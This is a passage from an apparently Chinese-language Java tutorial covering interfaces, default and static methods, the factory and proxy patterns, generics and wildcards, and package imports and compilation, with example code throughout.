&quot;通道创建失败&quot;;    &#125;    @Override    public boolean connect()&#123;        System.out.println(&quot;消息发送通道已经建立&quot;);        return true;    &#125;    @Override    public boolean getDatabaseConnection() &#123;        return true;    &#125;&#125;public class Test25 &#123;    public static void main(String[] args) &#123;        IMessage msg = new MessageImpl();        System.out.println(msg.getInfo());    &#125;&#125;\n\n​    虽然接口无法去继承一个父类，但是一个接口却可以通过extends继承若干个父接口，此时成为交接口的多继承。\n实现接口的多继承：\n//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个Iinterface IMessage1&#123;    public abstract String getInfo();//抽象方法&#125;interface IChannel1&#123;    public boolean connect();&#125;//接口多继承interface IService extends IMessage1,IChannel1&#123;    public String service();&#125;class MessageServiceImpl implements IService&#123;    @Override    public String getInfo() &#123;        return null;    &#125;    @Override    public boolean connect() &#123;        return true;    &#125;    @Override    public String service() &#123;        return &quot;获取消息服务&quot;;    &#125;&#125;public class Test26 &#123;    public static void main(String[] args) &#123;        IMessage1 msg = new MessageServiceImpl();        Object obj = msg;        MessageServiceImpl mes = (MessageServiceImpl) obj;        System.out.println(mes.service());    &#125;&#125;\n\n​    在实际的开发之中，接口的使用往往有三种形式：\n​    1、进行标准设置；\n​    2、表示一种操作的能力；\n​    3、暴露远程方法视图，这个一般在RPC分布式开发中使用。\n接口定义加强​    接口最早的主要特点是全部由抽象方法和全局常量所组成，如果项目设计不当，就会出现一个非常严重的问题。假如实现了写了1080个子类之后，发现接口设计不当，需要追加方法，那么需要拷贝1080份实现代码。\n\n​    该操作是结构设计不当的结果，所以为了方便子类的修改，往往不会让子类直接实现接口，而是往中间追加一个过渡的抽象类。\n\n​    在JDK1.8之后开始，为了解决接口设计的缺陷，所以在接口之中允许开发者定义普通方法。\ninterface IMessage2&#123;    public String message();    //新增的方法，是一个公共方法，都具备    public default boolean connect()&#123;        System.out.println(&quot;建立消息的发送通道&quot;);        return true;    &#125;&#125;class MessageImpl2 implements IMessage2&#123;    @Override    public String message() &#123;        return &quot;mes9s0&quot;;    &#125;&#125;public class Test27 &#123;    public static void main(String[] args) &#123;        IMessage2 msg = new MessageImpl2();        if (msg.connect())&#123;            System.out.println(msg.message());        &#125;    &#125;&#125;\n\n​    接口中的普通方法必须追加default的声明，但是需要提醒的是，该操作属于挽救功能，所以如果不是必须的情况下，不是设计的首选。\n​    除了可以追加普通方法外，接口里面也可以定义static方法了，而static方法可以通过接口直接调用了。\ninterface IMessage2 &#123;    public String message();    //新增的方法，是一个公共方法，都具备    public default boolean connect() &#123;        System.out.println(&quot;建立消息的发送通道&quot;);        return true;    &#125;    public static IMessage2 getInstance() &#123;        return new MessageImpl2();//获得子类对象    &#125;&#125;class MessageImpl2 implements IMessage2 &#123;    @Override    public String message() &#123;        if (this.connect()) &#123;            return &quot;mes9s0&quot;;        &#125;        return &quot;没有消息发送&quot;;    &#125;&#125;public class Test27 &#123;    public static void main(String[] args) &#123;        IMessage2 msg = IMessage2.getInstance();        System.out.println(msg.message());    &#125;&#125;\n\n​    接口里可以定义普通方法或static方法，那么这个功能就已经可以取代抽象类了，但是不应该将这两个组成作为接口的主要原则。接口的设计原则还是应该奉行：接口中就是抽象方法。\n使用接口定义标准​    对于接口而言在开发之中最为重要的应用就是进行标准的制定，实际上在日常的生活之中也会听见许多关于接口的名词，例如：USB接口、PCI接口等等。这些都是标准的应用。\n​    例如电脑可以插各种USB接口，所以电脑上认的只是USB标准，而不关心这个标准的具体实现类。\n//定义USB标准interface IUSB &#123;    public boolean check(); //检查通过可以工作    public void work();&#125;class Computer &#123;    public void plugin(IUSB usb) &#123;        if (usb.check()) &#123;            usb.work();        &#125;else &#123;            System.out.println(&quot;硬件设备安装出现问题无法使用&quot;);        &#125;    &#125;&#125;class Keyboard implements IUSB &#123;    @Override    public boolean check() &#123;        return true;    &#125;    @Override    public void work() &#123;        System.out.println(&quot;开始进行码字任务&quot;);    &#125;&#125;class Print implements IUSB&#123;    @Override    public boolean check() &#123;        return false;    &#125;    @Override    public void work() &#123;        System.out.println(&quot;开始进行照片打印&quot;);    &#125;&#125;public class Test28 &#123;    public static void main(String[] args) &#123;        Computer computer = new Computer();        computer.plugin(new Keyboard());//插入键盘        computer.plugin(new Print());//插入打印机    &#125;&#125;\n\n\n工厂设计模式（Factory）​    对于接口而言，已经可以明确的清楚，必须有子类，并且子类可以通过对象的向上转型来获取接口的实例化对象。但是在进行对象实例化的过程之中也有可能存在设计问题。\n//定义一个食物标准interface IFood&#123;        public boolean eat();//吃&#125;class Bread implements IFood&#123;    @Override    public boolean eat() &#123;        System.out.println(&quot;吃面包&quot;);      \treturn true;    &#125;&#125;public class Test29 &#123;    public static void main(String[] args) &#123;        IFood food = new Bread();        food.eat();    &#125;&#125;\n\n​    本程序之中根据接口进行子类的定义，并且利用对象的向上转型进行接口实例化处理\n\n​    客户端需要明确具体的那一个子类，如果说现在面包吃腻了，需要牛奶了，那么客户端就要做出修改。\n范例：扩展一类食物：\n//定义一个食物标准interface IFood&#123;        public boolean eat();//吃&#125;class Bread implements IFood&#123;    @Override    public boolean eat() &#123;        System.out.println(&quot;吃面包&quot;);        return true;    &#125;&#125;class Milk implements IFood&#123;    @Override    public boolean eat() &#123;        System.out.println(&quot;喝牛奶&quot;);        return true;    &#125;&#125;public class Test29 &#123;    public static void main(String[] args) &#123;        IFood food = new Milk();//耦合        food.eat();    &#125;&#125;\n\n​    此时的程序就表示出现了耦合的问题，而造成耦合最直接的元凶：“关键字new”。以JVM的设计为例，Java实现可移植性的关键在于JVM，JVM的核心原理：利用一个虚拟机来运行Java程序，所有的程序并不与操作系统有任何的关联，而是由JVM来进行匹配。所以得出结论，良好的程序应该避免耦合。\n工厂设计实现：\n//定义一个食物标准interface IFood&#123;        public boolean eat();//吃&#125;class Bread implements IFood&#123;    @Override    public boolean eat() &#123;        System.out.println(&quot;吃面包&quot;);        return true;    &#125;&#125;class Milk implements IFood&#123;    @Override    public boolean eat() &#123;        System.out.println(&quot;喝牛奶&quot;);        return true;    &#125;&#125;class Factory &#123;    public static IFood getInstance(String className)&#123;        if (&quot;break&quot;.equals(className))&#123;            return new Bread();        &#125;else if (&quot;milk&quot;.equals(className))&#123;            return new Milk();        &#125;else &#123;            return null;        &#125;    &#125;&#125;public class Test29 &#123;    public static void main(String[] args) &#123;        IFood food = Factory.getInstance(args[0]);        food.eat();    &#125;&#125;\n\n​    在本程序之中，客户端程序类与IFood接口的子类没有任何的关联，所有的关联都是通过Factory类完成的，可以在需要使用的时候通过初始化参数进行要使用的子类定义：1、java Test29 bread。2、java Test29 milk。\n\n​    如果在日后进行子类扩充的时候只需要修改Factory程序类即可实现。\n代理设计模式​    代理设计模式的主要功能是可以帮助用户将所有的开发注意力只集中在核心业务功能的处理上。\n例如：肚子饿了想如何吃到东西\n\n范例：实现代理设计\ninterface IEat&#123;    public void get();&#125;class EatReal implements IEat&#123;    @Override    public void get() &#123;        System.out.println(&quot;【真实主题】得到一份食物，而后开始品尝美味&quot;);    &#125;&#125;//服务代理class EatProxy implements IEat&#123;    private IEat eat;//为了吃而服务    public EatProxy(IEat eat)&#123;//一定要有一个代理项目        this.eat = eat;    &#125;    public void get()&#123;        this.prepare();        this.eat.get();        this.clear();    &#125;    public void prepare()&#123;//准备过程        System.out.println(&quot;【代理主题】1、精心购买食材&quot;);        System.out.println(&quot;【代理主题】2、小心的处理食材&quot;);    &#125;    public void clear()&#123;        System.out.println(&quot;【代理主题】3、收拾碗筷&quot;);    &#125;&#125;public class Test30 &#123;    public static void main(String[] args) &#123;        IEat eat = new EatProxy(new EatReal());        eat.get();    &#125;&#125;\n\n\n​    代理设计模式的主要特点是：一个接口提供有两个子类，其中一个子类是真实的业务操作类，另外一个主题是代理业务操作类，没有代理业务，真实业务无法展开。\n抽象类与借口的区别​    在实际的开发之中，抽象类和接口的形式是非常相似的，这一点从JDK1.8开始实际上就很明显，因为在JDK1.8里接口可以定义default和static方法，但实际还有很多区别。\n\n\n\nNO.\n区别\n抽象类\n接口\n\n\n\n1\n定义\nabstract class 抽象类名称\nInterface 接口名称\n\n\n2\n组成\n构造、普通方法、静态方法、全局方法、普通成员、static方法\n抽象方法、全局常量、普通方法、static方法\n\n\n3\n权限\n可以使用各种权限定义\n只能够使用public\n\n\n4\n子类使用\n子类使用extends关键字继承一个抽象类\n子类使用implements关键字可以实现多个接口\n\n\n5\n两者关系\n抽象类可以实现若干个接口\n接口不允许继承抽象类，但是允许继承多个父接口\n\n\n6\n使用\n1、抽象类或接口必须定义子类；2、子类一定要覆写抽象类或接口中的全部抽象方法；3、通过子类的向上转型实现抽象类或接口对象实例化\n1、抽象类或接口必须定义子类；2、子类一定要覆写抽象类或接口中的全部抽象方法；3、通过子类的向上转型实现抽象类或接口对象实例化\n\n\n​    当抽象类和接口都可以使用，要优先考虑接口，因为接口可以避免子类的单继承局限。\n​    从另一个正常的设计角度而言，也需要先从接口来进行项目的整体设计。\n\n\n综合案例：抽象类与接口应用​    抽象类与接口是Java里面最为核心的概念，也是所有设计模式的综合体现，包括在日后学习的过程之中也会接触到许多的系统提供的接口和抽象类。接口与抽象类都可以使用一定要优先接口。\n案例一（获取类信息）：​    定义一个ClassName接口，接口中只有一个抽象方法getClassName()：设计一个Company，该类实现接口ClassName中的方法getClassName（），功能是获得该类的类名称：编写应用程序使用Company类。\ninterface IClassName&#123;    public String getClassName();//数据一定要返回&#125;class Company implements IClassName&#123;    @Override    public String getClassName() &#123;        return &quot;Company&quot;;    &#125;&#125;public class Test31 &#123;    public static void main(String[] args) &#123;        IClassName ica = new Company();        System.out.println(ica.getClassName());    &#125;&#125;\n\n案例分析二​    考虑一个表示绘图的标准，并且可以根据不同的图形来进行绘制；\n\n//定义绘图标准interface IGraphical &#123;    public void paint();//绘图&#125;class Point &#123;    private double x;    private double y;    public Point(double x, double y) &#123;        this.x = x;        this.y = y;    &#125;    public double getX() &#123;        return this.x;    &#125;    public double getY() &#123;        return this.y;    &#125;&#125;//绘制三角形class Triangle implements IGraphical &#123;    private Point[] x;//第一条边的坐标    private Point[] y;//第二条边的坐标    private Point[] z;//第三条边的坐标    public Triangle(Point[] x, Point[] y, Point[] z) &#123;        this.x = x;        this.y = y;        this.z = z;    &#125;    public void paint() &#123;        System.out.println(&quot;绘制第一条边,开始坐标：[&quot; + this.x[0].getX() + &quot;,&quot; + this.x[1].getY() + &quot;],结束坐标[&quot; + this.x[1].getX() + &quot;,&quot; + this.x[1].getY() + &quot;]&quot;);        System.out.println(&quot;绘制第二条边,开始坐标：[&quot; + this.y[0].getX() + &quot;,&quot; + this.y[1].getY() + &quot;],结束坐标[&quot; + this.y[1].getX() + &quot;,&quot; + this.y[1].getY() + &quot;]&quot;);        System.out.println(&quot;绘制第三条边,开始坐标：[&quot; + this.z[0].getX() + &quot;,&quot; + this.z[1].getY() + &quot;],结束坐标[&quot; + this.z[1].getX() + &quot;,&quot; + this.z[1].getY() + &quot;]&quot;);    &#125;&#125;class Circular implements IGraphical &#123;    private double radius;    public Circular(double radius) &#123;        this.radius = radius;    &#125;    public void paint() &#123;        System.out.println(&quot;以半径为&quot; + this.radius + &quot;的圆形&quot;);    &#125;&#125;class Factory1 &#123;    public static IGraphical getInstance(String className, double... args) &#123;        if (&quot;triangle&quot;.equalsIgnoreCase(className)) &#123;            return new Triangle(                    new Point[]&#123;                            new Point(args[0], args[1]), new Point(args[2], args[3])&#125;,                    new Point[]&#123;                            new Point(args[4], args[5]), new Point(args[6], args[7])&#125;,                    new Point[]&#123;                            new Point(args[8], args[9]), new Point(args[10], args[11])&#125;            );        &#125; else if (&quot;circular&quot;.equalsIgnoreCase(className)) &#123;            return new Circular(args[0]);        &#125; else &#123;            return null;        &#125;    &#125;&#125;public class Test32 &#123;    public static void main(String[] args) &#123;        IGraphical iga = Factory1.getInstance(&quot;triangle&quot;,1.1,2.2,3.3,4.4,11.11,22.22,33.33,44.44,111.111,222.222,333.333,444.444);        iga.paint();        IGraphical igb = Factory1.getInstance(&quot;circular&quot;,88.11);        igb.paint();    &#125;&#125;\n\n案例分析三​    定义类Shape，用来表示一般二维图形。Shape具有抽象方法area和perimeter，用来计算形状的面积和周长。试定义一些二维形状类（如矩形、三角形、圆形、椭圆形等），这些类均为Shape类的子类。\n\n​    \nabstract class AbstractShape &#123;    public abstract double area();    public abstract double perimeter();&#125;class Circular1 extends AbstractShape &#123;    private double radius;    public Circular1(double radius) &#123;        this.radius = radius;    &#125;    public double area() &#123;        return 3.141592 * this.radius * this.radius;    &#125;    public double perimeter() &#123;        return 2 * 3.1415926 * this.radius;    &#125;&#125;class Rectangle extends AbstractShape &#123;    private double length;    private double width;    public Rectangle(double length, double width) &#123;        this.length = length;        this.width = width;    &#125;    public double area() &#123;        return this.length * this.width;    &#125;    public double perimeter() &#123;        return 2 * (this.width + this.length);    &#125;&#125;class Factory&#123;    public static AbstractShape getInstance(String className,double ... args)&#123;        if (&quot;Circular&quot;.equalsIgnoreCase(className))&#123;            return new Circular1(args[0]);        &#125;else if (&quot;Rectangle&quot;.equalsIgnoreCase(className))&#123;            return new Rectangle(args[0],args[1]);        &#125;else &#123;            return null;        &#125;    &#125;&#125;public class Test33 &#123;    public static void main(String[] args) &#123;        AbstractShape asa = Factory.getInstance(&quot;Circular&quot;,1.1);        AbstractShape asb = Factory.getInstance(&quot;Rectangle&quot;,1.5,10.2);        System.out.println(&quot;圆形面积：&quot;+asa.area()+&quot;圆形周长：&quot;+asa.perimeter());        System.out.println(&quot;矩形面积：&quot;+asb.area()+&quot;矩形周长：&quot;+asb.perimeter());    &#125;&#125;\n\n\n泛型​    泛型是从JDK1.5之后追加到Java语言里面的，其主要目的是为了解决ClassCastExcation的问题，在进行对象的向下转型时永远可能存在安全隐患，而Java希望通过泛型可以慢慢解决掉此类问题。\n泛型问题引出​    现在假设说定义一个描述x与y坐标的处理类，并且在这个类之中允许开发者保存有三类数据。1、整型数据：x=10、y=20；2、浮点型数据：x=10.1、y=20.9；3、字符串型数据：x=东经120度、北纬30度。\n​    于是在设计Point类的时候就需要去考虑具体的x和y属性的类型，这个类型要求可以保存以上三种数据。\n​    很明显，最为原始的做法使用Object类来进行定义，因为存在有如下的转型关系：\n​    1、整型数据：基本数据类型 –&gt; 包装为Integer类对象 –&gt; 自动向上转型为Object\n​    2、浮点型数据：基本数据类型 –&gt; 包装为Double类对象 –&gt; 自动向上转型为Object\n​    3、字符串数据：String类对象 –&gt; 自动向上转型为Object；\n范例：\n​    定义Point类如下\nclass Point1&#123;    private Object x;    private Object y;    public void setX(Object x)&#123;        this.x = x;    &#125;    public void setY(Object y)&#123;        this.y = y;    &#125;    public Object getX()&#123;        return this.x;    &#125;    public Object getY()&#123;        return this.y;    &#125;&#125;\n\n​    而后进行内容的设置\nclass Point1 &#123;    private Object x;    private Object y;    public void setX(Object x) &#123;        this.x = x;    &#125;    public void setY(Object y) &#123;        this.y = y;    &#125;    public Object getX() &#123;        return this.x;    &#125;    public Object getY() &#123;        return this.y;    &#125;&#125;public class Test34 &#123;    public static void main(String[] args) &#123;        Point1 point = new Point1();        //第一步：根据需求进行内容的设置        point.setX(10);//自动装箱        point.setY(20);//自动装箱        //第二步：从里面获取数据        int x = (Integer) point.getX();        int y = (Integer) point.getY();        System.out.println(&quot;x坐标：&quot; + x + &quot;;&quot; + &quot;、y坐标:&quot; + y);    &#125;&#125;\n\n​    本程序之所以可以解决当前的设计问题，主要的原因在于，Object可以接收所有的数据类型，但是正因为如此，所以本代码也会拥有严重的错误。下面是一个错误示范！！！！\npublic class Test34 &#123;    public static void main(String[] args) &#123;        Point1 point = new Point1();        //第一步：根据需求进行内容的设置        point.setX(10);//自动装箱        point.setY(&quot;北纬20度&quot;);!!!!!!!!!!!        //第二步：从里面获取数据        int x = (Integer) point.getX();        int y = (Integer) point.getY();        System.out.println(&quot;x坐标：&quot; + x + &quot;;&quot; + &quot;、y坐标:&quot; + y);    &#125;&#125;\n\n​    上面这段代码，如果在程序编译的时候实际上是不会有任何的错误产生的，而程序的执行的时候会出现java.lang.ClassCastException:异常类型错误，所以本程序的设计是存在安全隐患的。安全隐患的原因是使用了Object类型，因为Object可以涵盖的范围太广，而对于这样的错误如果可以出现在编译的阶段，那么可以极大程度的缓解运行时的尴尬。所以就出现了泛型。\n泛型基本定义​    如果要想避免项目之中出现“ClassCastException”最好的做法是可以直接回避掉对象的强制转换，所以在JDK1.5之后提供泛型技术，而泛型的本质在于，类中的属性或方法的参数与返回值的类型可以由对象实例化的时候动态确定。\n​    那么此时就需要再类定义的时候明确的定义占位符（泛型标记）。\n//T是Type的简写，可以定义多个泛型class Point1&lt;T&gt; &#123;    private T x;    private T y;    public void setX(T x) &#123;        this.x = x;    &#125;    public void setY(T y) &#123;        this.y = y;    &#125;    public T getX() &#123;        return this.x;    &#125;    public T getY() &#123;        return this.y;    &#125;&#125;\n\n​    此时Point类中的x与y属性的数据类型并不确定，而是由外部来决定。\n提示：关于默认的泛型模型。由于泛型是属于JDK1.5之后的产物，但是在这之前已经有不少内置的程序类或者是接口广泛的应用在了开发之中。于是为了保证这些类或者接口设置了泛型之后，原始的程序类依然可以使用，所以如果不设置泛型类型时，自动将使用Object作为类型，以保证程序的正常执行。但是编译会出现警告信息。\n​    泛型定义完成后可以在实例化对象的时候进行泛型类型的设置，一旦设置之后，里面的x与y的属性类型就与当前对象直接绑定了。\n//T是Type的简写，可以定义多个泛型class Point1&lt;T&gt; &#123;    private T x;    private T y;    public void setX(T x) &#123;        this.x = x;    &#125;    public void setY(T y) &#123;        this.y = y;    &#125;    public T getX() &#123;        return this.x;    &#125;    public T getY() &#123;        return this.y;    &#125;&#125;public class Test34 &#123;    public static void main(String[] args) &#123;        Point1&lt;Integer&gt; point = new Point1&lt;Integer&gt;();      \tPoint1&lt;String&gt; pointB = new Point1&lt;String&gt;();//第二个对象        //第一步：根据需求进行内容的设置        point.setX(10);//自动装箱        point.setY(20);//自动装箱        //第二步：从里面获取数据        int x = point.getX();        int y = point.getY();        System.out.println(&quot;x坐标：&quot; + x + &quot;;&quot; + &quot;、y坐标:&quot; + y);    &#125;&#125;\n\n​    现在的程序代码之中，由于Point类里面设置的泛型类型为Integer，这样所有的对应此泛型的属性、变量、方法返回值就将全部替换为Interger（只限于此对象之中），从而在上面的代码中也就避免了向下转型。这样我们在处理的时候如果发现设置的内容有错误，则会在编译的时候有错误提示，同时也避免了对象的向下转型处理（避免安全隐患）。\n​    泛型使用的注意点：\n​    1、泛型之中只允许设置引用类型，如果现在要操作基本类型必须使用包装类。\n​    2、从JDK1.7开始，泛型对象实例化可以简化为“Point point = new Point&lt;&gt;()”;后面可以省略\n​    使用泛型可以解决大部分的类对象的强制转换处理，这样的程序才是一个合理的设计。\n泛型通配符​    虽然泛型帮助开发者解决了一系列的对象的强制转换所带来的安全隐患，但是从另一个角度来看，泛型带来了一个新的问题，那就是引用传递处理。\n范例：问题产生\npackage two;//泛型引用传递处理class Message3&lt;T&gt;&#123;    private T content;    public void setContent(T content)&#123;        this.content = content;    &#125;    public T getContent()&#123;        return this.content;    &#125;&#125;public class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;String&gt; msg = new Message3&lt;&gt;();        msg.setContent(&quot;mes9s0&quot;);        fun(msg);//引用传递    &#125;    public static void fun(Message3&lt;String&gt; temp)&#123;        System.out.println(temp.getContent());    &#125;&#125;\n\n​    这是一个标准的引用传递，但是这个时候会出现问题。而问题的关键在于fun()方法上，如果真的去使用泛型不可能只是一种类型，也就是说fun()方法应该可以接收任意种类型，但是这个时候他只能够接收“Message3”类型。这时候我们在fun()方法中不设置泛型了。\npackage two;//泛型引用传递处理class Message3&lt;T&gt;&#123;    private T content;    public void setContent(T content)&#123;        this.content = content;    &#125;    public T getContent()&#123;        return this.content;    &#125;&#125;public class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;Integer&gt; msgA = new Message3&lt;&gt;();        Message3&lt;String&gt; msgB = new Message3&lt;&gt;();        msgA.setContent(110);        msgB.setContent(&quot;mes9s0&quot;);        fun(msgA);//引用传递        fun(msgB);    &#125;    public static void fun(Message3 temp)&#123;        System.out.println(temp.getContent());    &#125;&#125;\n\n​    可以发现程序可以正常执行了，但是一个更严重的问题出现了。此时我们这么写代码。\npackage two;//泛型引用传递处理class Message3&lt;T&gt;&#123;    private T content;    public void setContent(T content)&#123;        this.content = content;    &#125;    public T getContent()&#123;        return this.content;    &#125;&#125;public class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;Integer&gt; msgA = new Message3&lt;&gt;();        Message3&lt;String&gt; msgB = new Message3&lt;&gt;();        msgA.setContent(110);        msgB.setContent(&quot;mes9s0&quot;);        fun(msgA);//引用传递        fun(msgB);    &#125;    public static void fun(Message3 temp)&#123;        temp.setContent(1.1);//!!!!!!!!!!!添加的一行        System.out.println(temp.getContent());    &#125;&#125;\n\n    \n​    这个时候发现，如果不设置泛型，那么在方法之中就有可能对你的数据进行修改，所以此时我们还需要一种方案，可以接收所有的泛型类型，并且不能够修改里面的数据（允许获取），那么就需要通过通配符“&lt;?&gt;”来解决。\npublic class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;Integer&gt; msgA = new Message3&lt;&gt;();        Message3&lt;String&gt; msgB = new Message3&lt;&gt;();        msgA.setContent(110);        msgB.setContent(&quot;mes9s0&quot;);        fun(msgA);//引用传递        fun(msgB);    &#125;    public static void fun(Message3&lt;?&gt; temp)&#123;        System.out.println(temp.getContent());    &#125;&#125;\n\n​    此时在fun()方法里由于采用了Message结合通配符的处理可以接收所有的类型，并且不允许修改只允许获取数据。\n​    在“?”这个通配符的基础之上实际上还提供有两类小的通配符:\n​    1、?extends类：设置泛型的上限；\n​        -例如：定义“?extends Number”：表示该泛型类型只允许设置Number或Number的子类。\n​    2、?super类：设置泛型的下限；\n​        -例如：定义“?super String”：只能够使用String或其父类；\n范例：观察泛型的上限配置。\npackage two;//泛型引用传递处理class Message3&lt;T extends Number&gt;&#123;    private T content;    public void setContent(T content)&#123;        this.content = content;    &#125;    public T getContent()&#123;        return this.content;    &#125;&#125;public class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;Integer&gt; msgA = new Message3&lt;&gt;();        Message3&lt;String&gt; msgB = new Message3&lt;&gt;();//！！！        msgA.setContent(110);        msgB.setContent(&quot;mes9s0&quot;);//！！！！！不成功        fun(msgA);//引用传递        fun(msgB);//！！！    &#125;    public static void fun(Message3&lt;? extends Number&gt; temp)&#123;        System.out.println(temp.getContent());    &#125;&#125;\n\n​    此时编译不成功，因为只能是Number的子类。\n\n范例：设置泛型下限。\npackage two;//泛型引用传递处理class Message3&lt;T&gt;&#123;    private T content;    public void setContent(T content)&#123;        this.content = content;    &#125;    public T getContent()&#123;        return this.content;    &#125;&#125;public class Test35 &#123;    public static void main(String[] args) &#123;        Message3&lt;Integer&gt; msgA = new Message3&lt;&gt;();//!!!!!!!!!        Message3&lt;String&gt; msgB = new Message3&lt;&gt;();        msgA.setContent(110);//!!!!!!!!!        msgB.setContent(&quot;mes9s0&quot;);        fun(msgA);//引用传递        fun(msgB);//!!!!!!!!!!!!!!!!!    &#125;    public static void fun(Message3&lt;? super String&gt; temp)&#123;        System.out.println(temp.getContent());    &#125;&#125;\n\n​    通配符是一个重要的概念，并且要求你一定可以理解此概念的定义，在未来系统类库会有大量的使用。\n泛型接口​    泛型除了可以在类上定义之外也可以直接在接口之中进行使用。\n例如：下面定义一个泛型接口\ninterface IMessage3&lt;T&gt;&#123;    public String echo(T t);&#125;\n\n​    对于泛型接口的子类而言现在就有两种实现方式。\n实现方式一：在子类之中就继续设置泛型定义。\ninterface IMessage3&lt;T&gt;&#123;    public String echo(T t);&#125;//子类继续使用泛型class MessageImpl3&lt;S&gt; implements IMessage3&lt;S&gt;&#123;    public String echo(S t)&#123;        return &quot;【echo】&quot; + t;    &#125;&#125;public class Test36 &#123;    public static void main(String[] args) &#123;        IMessage3&lt;String&gt; msg = new MessageImpl3&lt;&gt;();        System.out.println(msg.echo(&quot;mes9s0&quot;));    &#125;&#125;\n\n实现方法二：在子类实现父接口的时候直接定义出具体泛型类型。\ninterface IMessage3&lt;T&gt;&#123;    public String echo(T t);&#125;//子类不继续使用泛型class MessageImpl3 implements IMessage3&lt;String&gt;&#123;    public String echo(String t)&#123;        return &quot;【echo】&quot; + t;    &#125;&#125;public class Test36 &#123;    public static void main(String[] args) &#123;        IMessage3&lt;String&gt; msg = new MessageImpl3();        System.out.println(msg.echo(&quot;mes9s0&quot;));    &#125;&#125;\n\n​    如果从概念和实现来讲并不复杂，但是在日后会遇见大量出现有泛型的接口，这个时候一定要清楚两种实现原则。\n泛型方法​    在之前的程序类里面实际上已经可以发现在泛型类之中如果将泛型标记写在了方法上，那么这样的方法就被称为泛型方法。但是需要注意注意的是，泛型方法不一定非要出现在泛型类之中。如果一个类没有定义泛型，那么也可以使用泛型方法。\npublic class Test37 &#123;    public static void main(String[] args) &#123;        Integer[] num = fun(1,2,3);        for (int temp:num)&#123;            System.out.print(temp+&quot;、&quot;);        &#125;    &#125;    public static &lt;T&gt; T[] fun(T ... args)&#123;        return args;    &#125;&#125;\n\n​    后期进行开发的时候，这种泛型方法很常见，以之前的工厂设计为例。\n\n​    此时如果一个项目有上千个接口，那原地起飞。\n\n​    哪怕是这样的传统设计模式，在工厂类中也会极度繁琐的重复方法。\ninterface IFood1&#123;    public void eat() ;&#125;class Factory3&#123;    public static &lt;T&gt; T getInstance(String classname) &#123;        switch(classname)&#123;            case &quot;bread&quot;: &#123;                return (T) new Bread1();            &#125; case &quot;milk&quot; : &#123;                return (T) new Milk1();            &#125; default:&#123;                return null;            &#125;        &#125;    &#125;&#125;class Bread1 implements IFood1&#123;    @Override    public void eat()&#123;        System.out.println(&quot;吃面包&quot;);    &#125;&#125;class Milk1 implements IFood1&#123;    @Override    public void eat() &#123;        System.out.println(&quot;喝牛奶&quot;);    &#125;&#125;public class Test37 &#123;    public static void main(String[] args) &#123;        IFood1 ifood = Factory3.getInstance(&quot;milk&quot;);        ifood.eat();        ifood = Factory3.getInstance(&quot;bread&quot;);        ifood.eat();    &#125;&#125;\n\n\n包的定义及使用​    利用包的可以实现类的包装，在以后的实际开发之中，所有的类都必须放在包里。\n包的定义​    操作系统中已经明确严格的定义了一个要求：同一个目录之中不允许存放有相同的程序类文件，但是在开发之中很难保证不重复，所以为了可以进行类的方便管理，那么往往可以程序文件放在不同的目录下，不同的目录之中是可以提供相同文件的，而这个包就是目录。\n​    注意，一旦程序开发之中出现有包，此时程序编译后的结果就必须将*.class的文件保存在指定的目录之中，如果手工处理非常的麻烦，那么此时最好的做法是可以进行打包编译处理：javac -d . Hello.java\n​    1、“-d”：表示要生成目录，而目录的结构就是package定义的结构\n​    2、“.”：表示在当前所在的目录中生成程序类文件\n​    有了包后，完整的类名称是包.类名称。\n包的导入​    利用包的定义可以将不同功能的类保存在不同的包之中，但是这些类彼此之间也会存在有互相调用的关系。这个时候需要import导入其他包中的程序类。\n范例：\n​    定义一个程序类“package.Message”，这个类负责进行一个消息数据。\npackage packageTest;public class Message &#123;    public String getContent()&#123;        return &quot;消息内容&quot;;    &#125;&#125;\n\n​    定义一个测试类使用Message类“package2.TestMessage”\npackage package2;import packageTest.Message;public class MessageTest &#123;    public static void main(String[] args) &#123;        Message msg = new Message();        System.out.println(msg.getContent());    &#125;&#125;\n\n​    此时按照使用顺序来讲肯定要先编译Message.java，而后再编译TestMessage.java。但是有一个问题，如果现在的程序代码，里面有100个类，彼此之间互相引用严格，此时怎么区分？那么此时最好不区分顺序，交给java自己完成，我们可以使用编译语句“javac -d . *.java”。\n​    我们把Message类中的public删掉，可以发现\n\n​    注意：关于public class 与class定义的区别\n​    public class：类名称必须与文件名称保持一致，一个.java文件里面只允许有一个public class，同时如果一个类需要被其他的包所使用，那么这个类一定要定义为public class。*\n​    class：类名称可以与文件名称不一致，并且在一个.java文件里面可以提供有多个class定义，编译后将形成不同的*.class文件，但是这些类只能够被本包所访问，如果要被其他的包所使用，那么这个类一定要定义为public class。*\n​    1、在实际的开发之中往往在一个.java源代码文件里面只会提供有一个程序类，而这个程序类一般都使用public class定义。所有的程序类中定义的包名称必须采用小写字母的形式定义。*\n​    有的时候比较麻烦，可使用包.*来进行加载。使用*也不会全部加载。但是在开发中采用的是“包.*”的形式进行的包的导入，有可能会有两个不同的包中有相同的类名称。这个时候会出现引用不明确，此时解决办法是写上类的完整名称。\n包的静态导入​    假如现在有一个类，这个类中的全部方法都是static方法，按照原始的做法必须全部导入“包.类”，而后通过类名称调用这些静态方法。\n范例：定义一个MyMath类，里面所有方法都是static\npackage package2;public class MyMath &#123;    public static int add(int... args) &#123;        int sum = 0;        for (int temp : args) &#123;            sum += temp;        &#125;        return sum;    &#125;    public static int sub(int x, int y) &#123;        return x - y;    &#125;&#125;\n\n​    如果此时按照原始的方式进行导入处理，那么此时就需要导入包.类，而后通过类名称进行调用。\n范例：原始方式使用\npackage packageTest;import package2.MyMath;public class Message &#123;    public static void main(String[] args) &#123;        System.out.println(MyMath.add(10,20,30));        System.out.println(MyMath.sub(30,20));    &#125;&#125;\n\n​    从JDK1.5之后对于类中全部由静态方法提供的特殊类是可以采用静态导入处理的。\n范例：静态导入处理\npackage packageTest;import static package2.MyMath.*;public class Message &#123;    public static void main(String[] args) &#123;        System.out.println(add(10,20,30));        System.out.println(sub(30,20));    &#125;&#125;\n\n​    当使用了静态导入处理之后就好比该方法是直接定义在主类之中，可以由主类直接调用。但实际很少这么写。\nJar命令​    当一个项目开发完成后一定会存在大量的*.class文件，那么对于这些文件的管理，我们可以用一种特殊的压缩结构进行处理，而这样的结构在java中被称为jar文件，可直接用Jar命令完成。\n​    